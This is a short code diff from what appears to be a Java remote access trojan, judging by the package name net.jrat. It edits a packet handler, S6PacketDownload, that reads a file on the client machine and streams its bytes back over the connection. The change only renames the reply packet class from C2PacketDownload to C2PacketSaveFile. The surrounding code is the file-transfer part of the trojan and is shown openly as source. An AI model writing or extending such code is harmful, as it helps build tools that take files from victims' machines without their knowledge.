@@ -7,7 +7,7 @@ import java.io.FileInputStream;
 
 import net.jrat.core.Client;
 import net.jrat.core.packet.IPacket;
-import net.jrat.core.packet.client.C2PacketDownload;
+import net.jrat.core.packet.client.C2PacketSaveFile;
 
 public class S6PacketDownload implements IPacket
 {
@@ -33,7 +33,7 @@ public class S6PacketDownload implements IPacket
 				writer.write(bytes, 0, read);
 			reader.close();
 			
-			Client.instance.outputStream.writeObject(new C2PacketDownload(writer.toByteArray(), this.outputpath));
+			Client.instance.outputStream.writeObject(new C2PacketSaveFile(writer.toByteArray(), this.outputpath));
 			writer.close();
 		}
 	}
